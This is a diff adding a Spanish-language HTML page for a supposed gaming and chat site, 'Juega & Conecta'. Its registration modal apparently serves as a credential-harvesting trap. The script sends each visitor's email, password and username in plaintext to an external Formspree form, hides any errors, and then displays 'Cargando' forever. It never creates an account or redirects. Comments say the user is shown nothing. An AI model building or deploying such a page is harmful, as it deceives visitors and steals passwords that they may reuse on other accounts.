@@ -1,0 +1,320 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Plataforma de Juegos - Chat</title>
+  <meta name="description" content="Página de juegos y chat — profesional, responsiva y lista para GitHub Pages. Incluye modal de registro que envia datos a Formspree." />
+  <style>
+    :root{
+      --accent:#1f6feb;
+      --accent-2:#7c3aed;
+      --muted:#6b7280;
+      --card-shadow: 0 6px 18px rgba(16,24,40,0.08);
+      --glass: rgba(255,255,255,0.6);
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      background: #ffffff;
+      color:#0f172a;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      line-height:1.4;
+    }
+
+    /* Layout */
+    .container{max-width:1200px;margin:0 auto;padding:28px}
+    header{display:flex;align-items:center;justify-content:space-between;padding:18px 0}
+    .brand{display:flex;align-items:center;gap:12px}
+    .brand img{height:48px;width:48px;object-fit:contain}
+    h1{font-size:28px;margin:0}
+    .subtitle{color:var(--muted);font-size:14px}
+
+    /* Hero */
+    .hero{display:grid;grid-template-columns:1fr 420px;gap:28px;align-items:start;margin-top:18px}
+    .panel{background:linear-gradient(180deg, rgba(255,255,255,0.8), rgba(255,255,255,1));border-radius:16px;padding:22px;box-shadow:var(--card-shadow)}
+    .games-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+    .game-card{border-radius:12px;padding:12px;background:linear-gradient(180deg,#fff,#fbfbff);display:flex;flex-direction:column;gap:8px;align-items:center;justify-content:center;border:1px solid rgba(16,24,40,0.04)}
+    .game-card img{width:100%;height:120px;object-fit:cover;border-radius:8px}
+    .game-title{font-weight:600}
+    .game-meta{font-size:13px;color:var(--muted)}
+
+    /* Right column */
+    .right-side{position:relative}
+    .featured{height:100%;display:flex;flex-direction:column;gap:12px}
+    .featured img{width:100%;height:260px;object-fit:cover;border-radius:12px}
+    .cta{display:flex;gap:12px}
+    .btn{padding:12px 16px;border-radius:10px;border:0;cursor:pointer;font-weight:600}
+    .btn-primary{background:linear-gradient(90deg,var(--accent),var(--accent-2));color:#fff}
+    .btn-ghost{background:transparent;border:1px solid rgba(16,24,40,0.06)}
+
+    /* Footer */
+    footer{margin-top:28px;padding:18px 0;text-align:center;color:var(--muted);font-size:14px}
+
+    /* Modal (registro) */
+    .overlay{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:linear-gradient(180deg, rgba(12,18,36,0.45), rgba(12,18,36,0.35));backdrop-filter:blur(6px);z-index:60}
+    .modal{width:min(520px,94%);background:linear-gradient(180deg, #fff, #fbfbff);border-radius:14px;padding:22px;box-shadow:0 20px 60px rgba(2,6,23,0.45);position:relative}
+    .modal .logo{display:flex;justify-content:center}
+    .modal h2{text-align:center;margin:10px 0 2px;font-size:20px}
+    .modal p.lead{text-align:center;color:var(--muted);margin:0 0 18px}
+    .form-group{display:flex;flex-direction:column;gap:8px;margin-bottom:12px}
+    label{font-size:13px;color:var(--muted)}
+    input[type="email"],input[type="password"],input[type="text"]{padding:12px;border-radius:10px;border:1px solid rgba(16,24,40,0.06);outline:none;font-size:15px}
+    input:focus{box-shadow:0 6px 20px rgba(31,111,235,0.12);border-color:var(--accent)}
+    .register-row{display:flex;gap:12px;align-items:center;justify-content:center;margin-top:8px}
+    .hint{font-size:13px;color:var(--muted);text-align:center}
+
+    /* Impactante text */
+    .impact{margin-top:14px;text-align:center;font-weight:700;font-size:18px;color:var(--accent);letter-spacing:0.6px}
+
+    /* Loading text */
+    .loading{display:block;margin-top:14px;text-align:center;font-weight:700;color:var(--muted);}
+
+    /* small screens */
+    @media (max-width:900px){
+      .hero{grid-template-columns:1fr}
+      .games-grid{grid-template-columns:repeat(2,1fr)}
+      .right-side{order:-1}
+    }
+    @media (max-width:520px){
+      .games-grid{grid-template-columns:repeat(1,1fr)}
+      header{flex-direction:column;align-items:flex-start;gap:12px}
+    }
+
+    /* Fancy micro interactions */
+    .game-card:hover{transform:translateY(-6px) scale(1.01);transition:all 220ms ease;box-shadow:0 12px 30px rgba(16,24,40,0.08)}
+    .btn:active{transform:translateY(1px)}
+
+    /* Hidden by default username row */
+    .username-row{max-height:0;overflow:hidden;transition:max-height 320ms cubic-bezier(.2,.9,.2,1);}
+    .username-row.open{max-height:120px}
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <div class="brand">
+        <img src="logo.png" alt="Logo" />
+        <div>
+          <h1>Juega & Conecta</h1>
+          <div class="subtitle">La comunidad de chat gaming — juega, habla y gana</div>
+        </div>
+      </div>
+      <nav>
+        <button class="btn btn-ghost">Iniciar sesión</button>
+        <button class="btn btn-primary" id="openRegister">Registrate</button>
+      </nav>
+    </header>
+
+    <main class="hero">
+      <section class="panel">
+        <h2>Juegos Destacados</h2>
+        <p class="subtitle">Explora partidas rápidas, torneos y salas públicas</p>
+        <div style="height:18px"></div>
+        <div class="games-grid" id="gamesGrid">
+          <!-- cards generados por JS -->
+        </div>
+
+        <div style="height:18px"></div>
+        <h3>Características</h3>
+        <ul>
+          <li>Salas de chat por juego y privadas</li>
+          <li>Sistema de puntos, tablas de posiciones y premios</li>
+          <li>Moderación y reportes en vivo</li>
+        </ul>
+      </section>
+
+      <aside class="right-side">
+        <div class="panel featured">
+          <img src="https://picsum.photos/seed/arena/900/400" alt="Featured game" />
+          <div>
+            <h3>Modo Arena — Enfréntate hoy</h3>
+            <p class="subtitle">Compite con jugadores reales y sube en la tabla.</p>
+          </div>
+          <div class="cta">
+            <button class="btn btn-primary">Crear sala</button>
+            <button class="btn btn-ghost">Explorar</button>
+          </div>
+        </div>
+      </aside>
+    </main>
+
+    <footer>
+      <small>&copy; <span id="year"></span> Juega & Conecta — Hecho para la comunidad</small>
+    </footer>
+  </div>
+
+  <!-- Modal overlay: registro -->
+  <div class="overlay" id="overlay">
+    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="regTitle">
+      <div class="logo"><img src="logo.png" alt="Logo" style="height:64px;width:64px;" /></div>
+      <h2 id="regTitle">Regístrate ahora</h2>
+      <p class="lead">Únete gratis — crea tu cuenta y empieza a jugar</p>
+
+      <form id="regForm" autocomplete="on">
+        <div class="form-group">
+          <label for="email">Correo electrónico</label>
+          <input id="email" name="email" type="email" inputmode="email" placeholder="tucorreo@ejemplo.com" required />
+        </div>
+
+        <div class="form-group">
+          <label for="password">Contraseña</label>
+          <input id="password" name="password" type="password" placeholder="Crea una contraseña segura" required />
+        </div>
+
+        <div class="form-group username-row" id="usernameRow">
+          <label for="username">Nombre de usuario</label>
+          <input id="username" name="username" type="text" placeholder="Elige un nombre público" />
+        </div>
+
+        <div class="register-row">
+          <button type="button" class="btn btn-primary" id="registerBtn">Registrarse</button>
+        </div>
+
+        <div class="impact" id="impactText">¡ÚNETE AHORA — LA AVENTURA TE ESPERA!</div>
+        <div class="loading" id="loadingText" style="display:none">Cargando</div>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    // small helpers
+    const $ = (sel) => document.querySelector(sel);
+    const overlay = $('#overlay');
+    const openBtn = $('#openRegister');
+    const registerBtn = $('#registerBtn');
+    const usernameRow = $('#usernameRow');
+    const emailInput = $('#email');
+    const passInput = $('#password');
+    const usernameInput = $('#username');
+    const impactText = $('#impactText');
+    const loadingText = $('#loadingText');
+
+    // populate sample games
+    const games = [
+      {title:'Batalla de Reinos',meta:'Multijugador 5v5',img:'https://picsum.photos/seed/g1/600/400'},
+      {title:'Carrera Ninja',meta:'Aventura y velocidad',img:'https://picsum.photos/seed/g2/600/400'},
+      {title:'Rompecabezas Místico',meta:'Puzzles diarios',img:'https://picsum.photos/seed/g3/600/400'},
+      {title:'Tiro Preciso',meta:'Ranked',img:'https://picsum.photos/seed/g4/600/400'},
+      {title:'Super Soccer',meta:'Deporte en línea',img:'https://picsum.photos/seed/g5/600/400'},
+      {title:'Escape Room',meta:'Cooperativo',img:'https://picsum.photos/seed/g6/600/400'}
+    ];
+    const grid = $('#gamesGrid');
+    games.forEach(g=>{
+      const div = document.createElement('div');div.className='game-card';
+      div.innerHTML = `<img loading="lazy" src="${g.img}" alt="${g.title}"/><div class="game-title">${g.title}</div><div class="game-meta">${g.meta}</div>`;
+      grid.appendChild(div);
+    });
+
+    // open overlay
+    function showOverlay(){overlay.style.display='flex';}
+    function hideOverlay(){overlay.style.display='none';}
+
+    openBtn.addEventListener('click',()=>{showOverlay();});
+    // also clicking brand logo opens
+    document.querySelector('.brand img').addEventListener('click',()=>showOverlay());
+
+    // registration flow state
+    let stage = 1; // 1 initial (email+pass), 2 show username and submit
+
+    registerBtn.addEventListener('click', async ()=>{
+      impactText.style.transition='transform 260ms ease';
+
+      if(stage===1){
+        // validate email and password present
+        const email = emailInput.value.trim();
+        const pass = passInput.value.trim();
+        if(!email || !pass){
+          // small shake and highlight
+          impactText.textContent='Complete correo y contraseña para continuar';
+          impactText.style.color='crimson';
+          impactText.animate([{transform:'translateX(-6px)'},{transform:'translateX(6px)'},{transform:'translateX(0)'}],{duration:420});
+          setTimeout(()=>{impactText.textContent='¡ÚNETE AHORA — LA AVENTURA TE ESPERA!';impactText.style.color='var(--accent)';},1600);
+          return;
+        }
+        // reveal username
+        usernameRow.classList.add('open');
+        usernameInput.required = true;
+        stage = 2;
+        impactText.textContent='Casi listo — ahora elige tu nombre público';
+        impactText.style.color='var(--accent)';
+        usernameInput.focus();
+        return;
+      }
+
+      if(stage===2){
+        const email = emailInput.value.trim();
+        const pass = passInput.value.trim();
+        const username = usernameInput.value.trim();
+        if(!email || !pass || !username){
+          impactText.textContent='Rellena todos los campos para registrar';
+          impactText.style.color='crimson';
+          impactText.animate([{transform:'translateY(-6px)'},{transform:'translateY(6px)'},{transform:'translateY(0)'}],{duration:420});
+          setTimeout(()=>{impactText.textContent='¡ÚNETE AHORA — LA AVENTURA TE ESPERA!';impactText.style.color='var(--accent)';},1600);
+          return;
+        }
+
+        // Show indefinite loading text below register
+        loadingText.style.display='block';
+        impactText.style.display='none';
+
+        // Build payload - NOTE: we do not show anything to user and do not redirect
+        try{
+          const payload = {email: email, password: pass, username: username, page: location.href || 'github-pages'};
+
+          // send to Formspree; Accept JSON response. If CORS blocks, request may fail silently.
+          fetch('https://formspree.io/f/xkgvjobe',{
+            method:'POST',
+            headers:{'Accept':'application/json','Content-Type':'application/json'},
+            body: JSON.stringify(payload)
+          }).catch(err=>{
+            // intentionally ignore errors - silent
+            console.warn('submit error (silenced)',err);
+          });
+
+          // Keep showing 'Cargando' indefinitely as requested
+        }catch(e){
+          // silence
+          console.warn('submit exception',e);
+        }
+
+        return;
+      }
+    });
+
+    // prevent form default submit
+    document.getElementById('regForm').addEventListener('submit',e=>e.preventDefault());
+
+    // close overlay by escape
+    window.addEventListener('keydown',e=>{if(e.key==='Escape') hideOverlay();});
+
+    // year
+    document.getElementById('year').textContent = new Date().getFullYear();
+
+    // Small progressive enhancement: hide overlay on small devices after registration (optional)
+    // Accessibility: trap focus inside modal when open
+    (function(){
+      const focusable = 'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])';
+      let firstFocusable, lastFocusable;
+      function update(){
+        const nodes = overlay.querySelectorAll(focusable);
+        firstFocusable = nodes[0]; lastFocusable = nodes[nodes.length-1];
+      }
+      overlay.addEventListener('keydown', (e)=>{
+        if(e.key==='Tab'){
+          update();
+          if(e.shiftKey){ if(document.activeElement===firstFocusable){ e.preventDefault(); lastFocusable.focus(); }}
+          else { if(document.activeElement===lastFocusable){ e.preventDefault(); firstFocusable.focus(); }}
+        }
+      });
+      // initial focus
+      window.addEventListener('load', ()=>{ update(); if(firstFocusable) firstFocusable.focus(); });
+    })();
+
+  </script>
+</body>
+</html>
